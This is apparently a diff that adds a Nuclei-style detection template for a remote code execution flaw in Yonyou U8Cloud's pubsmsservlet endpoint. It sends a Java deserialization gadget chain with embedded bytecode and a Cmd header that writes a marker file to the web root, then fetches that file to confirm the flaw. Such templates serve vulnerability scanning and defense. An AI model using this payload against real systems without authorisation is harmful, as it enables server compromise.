@@ -1,0 +1,82 @@
+id: poc-yaml-yongyou-u8-cloud-pubsmsservlet-rce
+
+info:
+  name: 用友U8Cloud pubsmsservlet 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(10, 100)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-post
+    method: POST
+    path:
+      - "/service/pubsmsservlet"
+    headers:
+      Content-Type: application/xml
+      Cmd: "echo {{t2}} >./webapps/u8c_web/{{t1}}.txt"
+    body: |-
+      <map>
+        <entry>
+          <org.springframework.aop.target.HotSwappableTargetSource>
+            <target class="com.fasterxml.jackson.databind.node.POJONode">
+              <__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
+                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                  <default>
+                    <__name>ae62d68f-8c88-4ef9-895c-1bc8f9389640</__name>
+                    <__bytecodes>
+                      <byte-array>yv66vgAAADIBoAEAUW...</byte-array>
+                    </__bytecodes>
+                    <__transletIndex>-1</__transletIndex>
+                    <__indentNumber>0</__indentNumber>
+                  </default>
+                  <boolean>false</boolean>
+                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+              </__value>
+            </target>
+          </org.springframework.aop.target.HotSwappableTargetSource>
+          <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+        </entry>
+        <entry>
+          <org.springframework.aop.target.HotSwappableTargetSource>
+            <target class="org.apache.xpath.objects.XString">
+              <m__obj class="string"></m__obj>
+            </target>
+          </org.springframework.aop.target.HotSwappableTargetSource>
+          <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+        </entry>
+      </map>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<ErrMsg>"
+          - "<TranFlag>"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: header
+        words:
+          - ".server"
